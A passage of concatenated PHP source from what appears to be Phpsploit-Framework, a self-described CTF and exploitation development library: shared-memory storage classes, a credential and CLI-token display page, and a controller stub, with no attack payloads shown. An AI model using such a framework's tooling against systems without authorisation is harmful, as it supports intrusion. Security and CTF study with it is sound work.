        $_item_end_flag     = Class_Base_Format::format_end_flag_read ( substr ( $_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_MODE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_TYPE + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_TYPE + self::SIZE_BLOCK_INDEXES_ITEM_RESERVED ) , self::SIZE_BLOCK_INDEXES_ITEM_END_FLAG ) );
        $_indexes_item      = new Class_Base_Block_IndexesItem( $_item_block_name , $_item_block_key , $_item_content_size , $_item_block_status , $_item_block_mode , $_item_block_type , $_item_content_type , $_item_reserved , $_item_end_flag );
        self::check_indexes_item_object ( $indexes_item );
        return $_indexes_item;
    }


    public static function get_indexes_item ( $key , $item_key )
    {
        $_block_id = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < self::SIZE_MAP ; $index += self::SIZE_MAP_ITEM ) {
                $_indexes_item_key = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::SIZE_MAP_ITEM , self::TYPE_CONTENT_STRING );
                if ( ! self::is_empty ( $_indexes_item_key ) ) {
                    $_item_key = Class_Base_Format::hex_to_dec ( substr ( $_indexes_item_key , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY ) );
                    if ( $_item_key == $item_key ) {
                        $_indexes_item = self::indexes_item_string_to_indexes_item_object ( $_indexes_item_key );
                        return $_indexes_item;
                    }
                }
            }
        }
        return null;
    }

    public static function set_indexes_item ( $key , $indexes_item )
    {
        if ( ( empty( $indexes_item ) ) || ( ! is_object ( $indexes_item ) ) || ( ! ( $indexes_item instanceof Class_Base_Block_IndexesItem ) ) ) {
            throw new \Exception( "indexes item is error" , 0 );
        }
        $_block_id = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < self::SIZE_MAP ; $index += self::SIZE_MAP_ITEM ) {
                $_indexes_item_key = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::SIZE_MAP_ITEM , self::TYPE_CONTENT_STRING );
                if ( ! self::is_empty ( $_indexes_item_key ) ) {
                    $_indexes_item_key = Class_Base_Format::hex_to_dec ( $_indexes_item_key );
                    if ( $_indexes_item_key == $indexes_item->get_block_key () ) {
                        $_indexes_item = self::indexes_item_object_to_indexes_item_string ( $indexes_item );
                        $_write_length = Class_Base_Memory::write_share_memory ( $_block_id , $_indexes_item , ( self::OFFSET_START + Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::TYPE_CONTENT_STRING );
                        return $_write_length;
                    }
                }
            }
        }
        return false;
    }

    public static function add_indexes_item ( $key , $indexes_item )
    {
        if ( ! self::exist_indexes_item ( $key , $indexes_item ) ) {
            $indexes_item = self::indexes_item_object_to_indexes_item_string ( $indexes_item );
            $_block_id    = self::get_block ( $key );
            if ( ! self::is_empty ( $_block_id ) ) {
                for ( $index = 0 ; $index < self::SIZE_MAP ; $index += self::SIZE_MAP_ITEM ) {
                    $_indexes_item = Class_Base_Memory::read_share_memory ( $_block_id , ( self::OFFSET_START + Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::SIZE_MAP_ITEM , self::TYPE_CONTENT_STRING );
                    if ( Class_Base_Format::is_empty ( $_indexes_item ) ) {
                        $_write_length = Class_Base_Memory::write_share_memory ( $_block_id , $indexes_item , ( self::OFFSET_START + Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::TYPE_CONTENT_STRING );
                        return $_write_length;
                    }
                }
            }
        }
        return false;
    }

    public static function exist_map_item ( $key , $item_key )
    {
        $_item_key = explode ( ":" , $item_key );
        if ( count ( $_item_key ) < 2 ) {
            throw new \Exception( "item key is error" , 0 );
        }
        $_block_key  = $_item_key[ 0 ];
        $_block_name = $_item_key[ 1 ];
        $_block_id   = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < self::SIZE_MAP ; $index += self::SIZE_MAP_ITEM ) {
                $_item = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::SIZE_MAP_ITEM , self::TYPE_CONTENT_STRING );
                if ( ! self::is_empty ( $_item ) ) {
                    $_indexes_item_block_name = Class_Base_Format::format_name_read ( substr ( $_item , ( self::OFFSET_START ) , self::SIZE_BLOCK_HEAD_BLOCK_NAME ) );
                    $_indexes_item_block_key  = Class_Base_Format::format_key_read ( substr ( $_item , ( self::OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME ) , self::SIZE_BLOCK_HEAD_BLOCK_KEY ) );
                    if ( ( ! Class_Base_Format::is_empty ( $_block_key ) ) && ( ! Class_Base_Format::is_empty ( $_block_name ) ) && ( ! Class_Base_Format::is_empty ( $_indexes_item_block_key ) ) && ( ! Class_Base_Format::is_empty ( $_indexes_item_block_name ) ) && ( $_indexes_item_block_key == $_block_key ) && ( $_indexes_item_block_name == $_block_name ) ) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    public static function get_map_count ( $key )
    {
        $_count    = 0;
        $_block_id = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < self::SIZE_MAP ; $index += self::SIZE_MAP_ITEM ) {
                $_item = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::SIZE_MAP_ITEM , self::TYPE_CONTENT_STRING );
                if ( ! self::is_empty ( $_item ) ) {
                    $_indexes_item_block_name = Class_Base_Format::format_name_read ( substr ( $_item , ( self::OFFSET_START ) , self::SIZE_BLOCK_HEAD_BLOCK_NAME ) );
                    $_indexes_item_block_key  = Class_Base_Format::format_key_read ( substr ( $_item , ( self::OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME ) , self::SIZE_BLOCK_HEAD_BLOCK_KEY ) );
                    if ( ( ! Class_Base_Format::is_empty ( $_indexes_item_block_key ) ) && ( ! Class_Base_Format::is_empty ( $_indexes_item_block_name ) ) ) {
                        $_count++;
                    }
                }
            }
        }
        return $_count;
    }

    public static function get_map_count_for_clear ( $key )
    {
        $_count    = 0;
        $_block_id = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < self::SIZE_MAP ; $index += self::SIZE_MAP_ITEM ) {
                $_item = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::SIZE_MAP_ITEM , self::TYPE_CONTENT_STRING );
                if ( ! self::is_empty ( $_item ) ) {
                    $_indexes_item_block_key = Class_Base_Format::format_key_read ( substr ( $_item , ( self::OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME ) , self::SIZE_BLOCK_HEAD_BLOCK_KEY ) );
                    if ( ( ! Class_Base_Format::is_empty ( $_indexes_item_block_key ) ) ) {
                        $_count++;
                    }
                }
            }
        }
        return $_count;
    }

    public static function read_map_item ( $key , $item_key )
    {
        $_map_item_key = explode ( ":" , $item_key );
        if ( count ( $_map_item_key ) < 2 ) {
            throw new \Exception( "map item key is error" , 0 );
        }
        $_block_key  = $_map_item_key[ 0 ];
        $_block_name = $_map_item_key[ 1 ];
        $_item       = self::read_indexes_item ( $key , $_block_key , $_block_name );
        return $_item;
    }

    public static function write_map_item ( $key , $item )
    {
        $_write_length = self::write_indexes_item ( $key , $item );
        return $_write_length;
    }

    public static function get_map_item ( $key , $item_key )
    {
        $_length = self::read_map_item ( $key , $item_key );
        return $_length;
    }

    public static function set_map_item ( $key , $item )
    {
        $_length = self::write_map_item ( $key , $item );
        return $_length;
    }

    public static function set_map ( $key , $map )
    {
        $_write_result = array ();
        if ( is_array ( $map ) ) {
            foreach ( $map as $k => $item ) {
                if ( ( empty( $item ) ) || ( ! is_object ( $item ) ) || ( ! ( $item instanceof Interface_Base_Block_IndexesItem ) ) ) {
                    throw new \Exception( "map item is not a indexes item object , map item ( " . print_r ( $item , true ) . " ) " , 0 );
                }
                $_length = self::write_map_item ( $key , $item );
                if ( self::is_empty ( $_length ) ) {
                    $_write_result[ $k ] = 0;
                } else {
                    $_write_result[ $k ] = 1;
                }

            }
        }
        return $_write_result;
    }

    public static function get_map ( $key )
    {
        $_map      = array ();
        $_block_id = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < self::SIZE_MAP ; $index += self::SIZE_MAP_ITEM ) {
                $_item = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::SIZE_MAP_ITEM , self::TYPE_CONTENT_STRING );
                if ( ! self::is_empty ( $_item ) ) {
                    $_item_block_name = Class_Base_Format::format_key_read ( substr ( $_item , ( self::OFFSET_BLOCK_INDEXES_ITEM_START ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) );
                    $_item_block_key  = Class_Base_Format::format_key_read ( substr ( $_item , ( self::OFFSET_BLOCK_INDEXES_ITEM_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY ) );
                    if ( ( ! self::is_empty ( $_item_block_key ) ) && ( ! self::is_empty ( $_item_block_name ) ) ) {
                        $_item_key          = ( $_item_block_key . $_item_block_name );
                        $_map[ $_item_key ] = self::indexes_item_string_to_indexes_item_object ( $_item );
                    }
                }
            }
        }
        return $_map;
    }

    public static function clear ( $key )
    {
        $_block_id = self::get_block ( $key );
        if ( ! empty( $_block_id ) ) {
            $_block_type = Class_Base_Memory::read_share_memory ( $_block_id , Class_Base_BlockHead::get_head_block_type_offset () , Class_Base_BlockHead::get_head_block_type_size () );
            if ( $_block_type == Interface_Base_BlockType::TYPE_BLOCK_INDEXES ) {
                if ( self::get_map_count_for_clear ( $key ) < 1 ) {
                    $_bool = Class_Base_Memory::clear_share_memory_by_key ( $key , self::SIZE_BLOCK );
                    if ( ! empty( $_bool ) ) {
                        self::clear_indexes_key ( $key );
                    }
                    return $_bool;
                }
            }
        }
        return false;
    }

    public static function get_check_keys_status ( $key )
    {
        if ( array_key_exists ( $key , self::$_check_keys_status ) ) {
            return self::$_check_keys_status[ $key ];
        }
        return null;
    }

    public static function is_check_keys_status ( $key )
    {
        if ( array_key_exists ( $key , self::$_check_keys_status ) ) {
            if ( ! empty( self::$_check_keys_status[ $key ] ) ) {
                return true;
            }
        }
        return false;
    }

    public static function enable_check_keys_status ( $key )
    {
        self::$_check_keys_status[ $key ] = 1;
    }

    public static function start_check_status ( $key )
    {
        if ( self::is_check_keys_status ( $key ) ) {
            return false;
        }
        self::enable_check_keys_status ( $key );
        return true;
    }

    public static function clear_check_status ( $key )
    {
        if ( array_key_exists ( $key , self::$_check_keys_status ) ) {
            self::$_check_keys_status[ $key ] = null;
            unset( self::$_check_keys_status[ $key ] );
        }
    }

    public static function check_object_params ( $head , $content , $end_flag )
    {
        if ( ( ( ! is_object ( $head ) ) && ( ! is_string ( $head ) ) ) || ( ( ! is_object ( $content ) ) && ( ! is_string ( $content ) ) ) || ( ( ! is_object ( $end_flag ) ) && ( ! is_string ( $end_flag ) ) ) ) {
            throw new \Exception( "head or data or end_flag is not a string or object" , 0 );
        }
        if ( is_object ( $head ) && is_object ( $content ) && is_object ( $end_flag ) ) {
            if ( ( ! ( $head instanceof Class_Base_BlockHead ) ) || ( ! ( $content instanceof Class_Base_BlockContent ) ) || ( ! ( $end_flag instanceof Class_Base_BlockEndFlag ) ) ) {
                throw new \Exception( "head or data or end_flag is error , head( " . print_r ( $head , true ) . " ) , data : ( " . $content . " ) , end_flag : ( " . $end_flag . " ) " , 0 );
            }
            if ( ( strlen ( $head->get_block_string () ) != Class_Base_BlockHead::SIZE_BLOCK_HEAD ) || ( $content->get_content_size () != $head->get_content_size () ) || ( strlen ( $end_flag->get_block_string () ) != Class_Base_BlockEndFlag::SIZE_BLOCK_END_FLAG ) ) {
                throw new \Exception( "head size or data size or end_flag size is error" , 0 );
            }
        } else if ( is_string ( $head ) && is_string ( $content ) && is_string ( $end_flag ) ) {
            if ( strlen ( $head ) != Class_Base_BlockHead::get_head_size () ) {
                throw new \Exception( "unique index block head size is error , head param size( " . strlen ( $head ) . " ) , head size ( " . Class_Base_BlockHead::get_head_size () . " ) " , 0 );
            }
            $_block_key = substr ( $head , Class_Base_BlockHead::get_head_block_key_offset () , Class_Base_BlockHead::get_head_block_key_size () );
            if ( Class_Base_Format::is_empty ( $_block_key ) || ( ! Class_Base_Format::is_min_to_max_hex ( $_block_key , Class_Base_Format::HEX_KEY_MIN_VALUE , Class_Base_Format::HEX_KEY_MAX_VALUE ) ) ) {
                throw new \Exception( "unique index block head key is error , key ( " . $_block_key . " ) " , 0 );
            }
            $_data_size = substr ( $head , Class_Base_BlockHead::get_head_content_size_offset () , Class_Base_BlockHead::get_head_content_size_size () );
            $_data_size = Class_Base_Format::hex_to_dec ( $_data_size );
            if ( strlen ( $content ) != $_data_size ) {
                throw new \Exception( "unique index block data size is error , data param size ( " . strlen ( $content ) . " ) , data size ( " . $_data_size . " ) " , 0 );
            }
            if ( strlen ( $end_flag ) != Class_Base_BlockEndFlag::get_end_flag_size () ) {
                throw new \Exception( "unique index block end_flag size is error , end_flag param size ( " . strlen ( $end_flag ) . " ) , end_flag size ( " . Class_Base_BlockEndFlag::get_end_flag_size () . " ) " , 0 );
            }
        } else {
            throw new \Exception( "unique index block params is error ,  head ( " . print_r ( $head , true ) . " ) , data ( " . print_r ( $content , true ) . " ) , end_flag ( " . print_r ( $end_flag , true ) . " ) " , 0 );
        }
    }

    public function __construct ( $head , $content , $end_flag )
    {
        self::check_object_params ( $head , $content , $end_flag );
        if ( is_object ( $head ) && is_object ( $content ) && is_object ( $end_flag ) ) {
            $this->_head     = $head->get_block_string ();
            $this->_content  = $content->get_block_string ();
            $this->_end_flag = $end_flag->get_block_string ();
        } else if ( is_string ( $head ) && is_string ( $content ) && is_string ( $end_flag ) ) {
            $this->_head     = $head;
            $this->_content  = $content;
            $this->_end_flag = $end_flag;
        }
        parent::__construct ( $this->_head , $this->_content , $this->_end_flag );
    }

    public function __destruct ()
    {
        $this->_head     = null;
        $this->_content  = null;
        $this->_end_flag = null;
    }

    public function create_block_string ()
    {
        $_block_string = ( $this->_head . $this->_content . $this->_end_flag );
        return $_block_string;
    }

    public function get_create_block_string_size ()
    {
        $_block_string        = self::create_block_string ();
        $_block_string_length = strlen ( $_block_string );
        return $_block_string_length;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-7
 * Time: 下午3:11
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View_Init_User_Info extends Class_View
{
    public static function init ( $params = array () )
    {
        if ( ! is_cli () ) {
            if ( ! is_array ( $params ) ) {
                $params = array ();
            }
            if ( ( ! isset( $params[ "privilege_user" ] ) ) || ( ! is_string ( $params[ "privilege_user" ] ) ) || ( strlen ( $params[ "privilege_user" ] ) <= 0 ) ) {
                $params[ "privilege_user" ] = "";
            }
            if ( ( ! isset( $params[ "privilege_password" ] ) ) || ( ! is_string ( $params[ "privilege_password" ] ) ) || ( strlen ( $params[ "privilege_password" ] ) <= 0 ) ) {
                $params[ "privilege_password" ] = "";
            }
            $_cli_url        = Class_Base_Response::get_cli_url ( "init_user_info" , array ( "privilege_user" => $params[ "privilege_user" ] , "privilege_password" => $params[ "privilege_password" ] ) );
            $_cli_encode_url = Class_Base_Response::get_urlencode ( $_cli_url );
            $_content        = '<div style="height:16px;margin-top:32px;"></div><div style="line-height:32px;font-size:32px;text-align: center;">Initialize in phpsploit-framework</div><div style="height:32px;"></div>';
            $_content        .= '<div style="width:80%;word-break:break-all;margin-top:32px;padding-left:10%;padding-right:0;text-align: left;font-size: 18px;">Important Note : <span style="font-size: 18px;color:red;">You need to remember the username, user password, cli token, and other information generated after each initialization of the phpsploit framework software! After you exit the phpsploit framework software and before re initializing the phpsploit framework software, you need to use the generated username, user password, and cli token to log in and use the phpsploit framework software! If you do not remember the username, user password, cli token, and other information generated after the initialization of the phpsploit framework software, it may cause you to be unable to continue using the phpsploit framework software after it exits, until you perform the initialization operation on the phpsploit framework software again!</div>';
            return ( Class_View::form_page (
                array (
                    "title"   => "login to phpsploit-framework" ,
                    "content" => $_content ,
                ) ,
                array (
                    "action"    => "/login" ,
                    "inputs"    => array (
                        array (
                            "title"    => "User : " ,
                            "describe" => "user" ,
                            "name"     => "user" ,
                            "value"    => $params[ "user" ] ,
                            "disabled" => "disabled" ,
                        ) ,
                        array (
                            "title"    => "Password : " ,
                            "describe" => "password" ,
                            "name"     => "password" ,
                            "value"    => $params[ "password" ] ,
                            "disabled" => "disabled" ,
                        ) ,
                        array (
                            "title"    => "Cli Token : " ,
                            "describe" => "Cli Token" ,
                            "name"     => "cli_token" ,
                            "value"    => $params[ "md5_token" ] ,
                            "disabled" => "disabled" ,
                        ) ,
                        array (
                            "title"    => "Privileged User : " ,
                            "describe" => "Privileged User" ,
                            "name"     => "privilege_user" ,
                            "value"    => $params[ "privilege_user" ] ,
                            "disabled" => "disabled" ,
                        ) ,
                        array (
                            "title"    => "Privileged Password : " ,
                            "describe" => "Privileged Password" ,
                            "name"     => "privilege_password" ,
                            "value"    => $params[ "privilege_password" ] ,
                            "disabled" => "disabled" ,
                        ) ,
                    ) ,
                    "textareas" => array (
                        array (
                            "id"       => "cli_encode_url" ,
                            "title"    => "( Cli Encode URL )   : " ,
                            "name"     => "cli_encode_url" ,
                            "value"    => ( 'cli url : ' . $_cli_url . "\n\n" . 'cli encode url : ' . $_cli_encode_url . "\n\n" ) ,
                            "disabled" => "disabled" ,
                            "style"    => 'height:400px;' ,
                        ) ,
                    ) ,
                    "submit"    => array (
                        "id"    => "submit_form" ,
                        "type"  => "submit" ,
                        "title" => "( Start To Login Phpsploit-Framework Software )" ,
                        "name"  => "submit_form" ,
                        "value" => "submit" ,
                    ) ,
                    "gets"      => array () ,
                ) ,
                array (
                    "menu"       => array () ,
                    "content"    => "<div></div>" ,
                    "javascript" => '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return confirm_submit();} function confirm_submit(){if(confirm(\'Are you sure you want to click the `submit` button now ? Before officially clicking the `submit` button, you should keep in mind the dynamically generated `User, Password, Cli Token` and other information, as they will be used to log in to the web or command - line environment of the Phpsploit Framework software!If you do not remember the above information, it will cause you to be unable to use the Phpsploit Framework software properly!If you forget information such as` User, Password, Cli Token `, you need to contact the server administrator of the environment where the Phpsploit Framework software is located and have them take corresponding actions on the shared memory . In general, the Phpsploit Framework software uses shared memory with KEY `0x5d8a0000` and KEY `0x5d8a0001` to store login information for the Phpsploit Framework software . However, it is not ruled out that other software will use these two shared memory resources, and you need to identify them according to the specific situation!If the shared memory with KEY of `0x5d8a0000` and KEY of `0x5d8a0001` is occupied by the Phpsploit Framework software, in a scenario where no special unexpected circumstances occur, the access permission to the shared memory with KEY of `0x5d8a0000` is `660`, and the space size of the shared memory with KEY of `0x5d8a0000` is `32 bytes`; The access permission for shared memory with KEY `0x5d8a0001` is` 660 `, and the space size for shared memory with KEY` 0x5d8a0001 `is` 1048712 bytes` . You can view shared memory information through the ipcs -m command ( which may require sufficient access and operation permissions), and you can use the ipcrm -M ' . Class_Base_Format::htmlentities ( '<shmem key>' ) . ' command to clean up specified shared memory resources.Appropriate shared memory cleaning operations can reset the login authentication information of Phpsploit Framework software! However, you must take it seriously and maintain a cautious attitude towards the cleaning of shared memory. Improper memory data cleaning operations may lead to system or software and hardware resources crashing, damaging, and related storage data loss and damage!\')){this.type="submit";return true;}else{this.type="button";return false;}}</script>' ,
                )
            ) );
        }
        return null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 22-12-20
 * Time: 下午11:10
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_File_Editor extends Class_Controller
{
    public static function index ( $params = array () )
    {


        Class_Base_Response::output ( Class_View::index () );
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-1-24
 * Time: 上午11:36
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Block_Data extends Class_Base_Block implements Interface_Base_Block_Data
{
    private $_key      = null;
    private $_size     = null;
    private $_head     = null;
    private $_content  = null;
    private $_end_flag = null;

    public static function create_key ()
    {
        $_key = Base_BlockUniqueIndex::get_index ( Base_BlockUniqueIndex::KEY );
        return $_key;
    }

    public static function create_block_object ( $key , $size , $head , $content , $end_flag )
    {
        $_block_data = new Base_BlockData( $key , $size , $head , $content , $end_flag );
        return $_block_data;
    }

    public static function get_block_data ( $key , $size )
    {
        $_block_size = ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $size + Class_Base_BlockEndFlag::SIZE_BLOCK_END_FLAG );
        $_block_id   = Class_Base_Memory::open_share_memory ( $key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , $_block_size );
        $_block_data = Class_Base_Memory::read_share_memory ( $_block_id , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , $_block_size , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        return $_block_data;
    }

    public static function get_block_object ( $key , $size )
    {
        $_block_size     = ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $size + Class_Base_BlockEndFlag::SIZE_BLOCK_END_FLAG );
        $_block_data     = self::get_block_data ( $key , $size );
        $_block_head     = substr ( $_block_data , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , Class_Base_BlockHead::get_head_size () );
        $_block_content  = substr ( $_block_data , Class_Base_BlockHead::SIZE_BLOCK_HEAD , $size );
        $_block_end_flag = substr ( $_block_data , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $size ) , Class_Base_BlockEndFlag::get_end_flag_size () );
        $_block_object   = new Base_BlockData( $key , $_block_size , $_block_head , $_block_content , $_block_end_flag );
        return $_block_object;
    }

    public static function read ( $key , $size )
    {
        $_block_size = ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $size + Class_Base_BlockEndFlag::SIZE_BLOCK_END_FLAG );
        $_block_id   = Class_Base_Memory::open_share_memory ( $key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , $_block_size );
        if ( empty( $_block_id ) ) {
            throw new \Exception( "share memeory id is error" , 0 );
        }
        $_data = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START + Class_Base_BlockHead::SIZE_BLOCK_HEAD ) , $size );
        return $_data;
    }

    public static function write ( $key , $value , $size )
    {
        $_block_size = ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $size + Class_Base_BlockEndFlag::SIZE_BLOCK_END_FLAG );
        $_block_id   = Class_Base_Memory::open_share_memory ( $key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , $_block_size );
        if ( empty( $_block_id ) ) {
            throw new \Exception( "share memory id is error" , 0 );
        }
        $_length = Class_Base_Memory::write_share_memory ( $_block_id , $value , ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START + Class_Base_BlockHead::SIZE_BLOCK_HEAD ) );
        return $_length;
    }

    public static function clear_block ( $key , $size )
    {
        $_block_size = ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $size + Class_Base_BlockEndFlag::SIZE_BLOCK_END_FLAG );
        $_block_id   = Class_Base_Memory::open_share_memory ( $key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , $_block_size );
        if ( ! empty( $_block_id ) ) {
            $_type = Class_Base_Memory::read_share_memory ( $_block_id , Class_Base_BlockHead::get_head_block_type_offset () , Class_Base_BlockHead::get_head_block_type_size () );
            if ( $_type == Interface_Base_BlockType::TYPE_BLOCK_DATA ) {
                $_bool = Class_Base_Memory::clear_share_memory_by_key ( $key , $_block_size );
                return $_bool;
            }
        }
        return false;
    }

    public static function check_object_params ( $head , $content , $end_flag )
    {
        if ( ( ( ! is_object ( $head ) ) && ( ! is_string ( $head ) ) ) || ( ( ! is_object ( $content ) ) && ( ! is_string ( $content ) ) ) || ( ( ! is_object ( $end_flag ) ) && ( ! is_string ( $end_flag ) ) ) ) {
            throw new \Exception( "head or data or end_flag is not a string or object" , 0 );
        }
        if ( is_object ( $head ) && is_object ( $content ) && is_object ( $end_flag ) ) {
            if ( ( ! ( $head instanceof Class_Base_BlockHead ) ) || ( ! ( $content instanceof Class_Base_BlockContent ) ) || ( ! ( $end_flag instanceof Class_Base_BlockEndFlag ) ) ) {
                throw new \Exception( "head or data or end_flag is error , head( " . print_r ( $head , true ) . " ) , data : ( " . $content . " ) , end_flag : ( " . $end_flag . " ) " , 0 );
            }
            if ( ( strlen ( $head->get_block_string () ) != Class_Base_BlockHead::SIZE_BLOCK_HEAD ) || ( $content->get_content_size () != $head->get_size () ) || ( strlen ( $end_flag->get_block_string () ) != Class_Base_BlockEndFlag::SIZE_BLOCK_END_FLAG ) ) {
                throw new \Exception( "head size or data size or end_flag size is error" , 0 );
            }
        } else if ( is_string ( $head ) && is_string ( $content ) && is_string ( $end_flag ) ) {
            if ( strlen ( $head ) != Class_Base_BlockHead::get_head_size () ) {
                throw new \Exception( "unique index block head size is error , head param size( " . strlen ( $head ) . " ) , head size ( " . Class_Base_BlockHead::get_head_size () . " ) " , 0 );
            }
            $_block_key = substr ( $head , Class_Base_BlockHead::get_head_block_key_offset () , Class_Base_BlockHead::get_head_block_key_size () );
            if ( Class_Base_Format::is_empty ( $_block_key ) || ( ! Class_Base_Format::is_min_to_max_hex ( $_block_key , Class_Base_Format::HEX_KEY_MIN_VALUE , Class_Base_Format::HEX_KEY_MAX_VALUE ) ) ) {
                throw new \Exception( "unique index block head key is error , key ( " . $_block_key . " ) " , 0 );
            }
            $_data_size = substr ( $head , Class_Base_BlockHead::get_head_content_size_offset () , Class_Base_BlockHead::get_head_content_size_size () );
            $_data_size = Class_Base_Format::hex_to_dec ( $_data_size );
            if ( strlen ( $content ) != $_data_size ) {
                throw new \Exception( "unique index block data size is error , data param size ( " . strlen ( $content ) . " ) , data size ( " . $_data_size . " ) " , 0 );
            }
            if ( strlen ( $end_flag ) != Class_Base_BlockEndFlag::get_end_flag_size () ) {
                throw new \Exception( "unique index block end_flag size is error , end_flag param size ( " . strlen ( $end_flag ) . " ) , end_flag size ( " . Class_Base_BlockEndFlag::get_end_flag_size () . " ) " , 0 );
            }
        } else {
            throw new \Exception( "unique index block params is error ,  head ( " . print_r ( $head , true ) . " ) , data ( " . print_r ( $content , true ) . " ) , end_flag ( " . print_r ( $end_flag , true ) . " ) " , 0 );
        }
    }

    public function __construct ( $key , $size , $head , $content , $end_flag )
    {
        self::check_object_params ( $head , $content , $end_flag );
        $this->_key  = Class_Base_Format::format_key_write ( $key );
        $this->_size = Class_Base_Format::format_size_write ( $size );
        if ( is_object ( $head ) && is_object ( $content ) && is_object ( $end_flag ) ) {
            $this->_head     = $head->get_block_string ();
            $this->_content  = $content->get_block_string ();
            $this->_end_flag = $end_flag->get_block_string ();
        } else if ( is_string ( $head ) && is_string ( $content ) && is_string ( $end_flag ) ) {
            $this->_head     = $head;
            $this->_content  = $content;
            $this->_end_flag = $end_flag;
        }
    }

    public function __destruct ()
    {
        $this->_key      = null;
        $this->_size     = null;
        $this->_head     = null;
        $this->_content  = null;
        $this->_end_flag = null;
    }

    public function get_key ()
    {
        $_key = Class_Base_Format::hex_to_dec ( $this->_key );
        return $_key;
    }

    public function get_size ()
    {
        $_size = Class_Base_Format::hex_to_dec ( $this->_size );
        return $_size;
    }

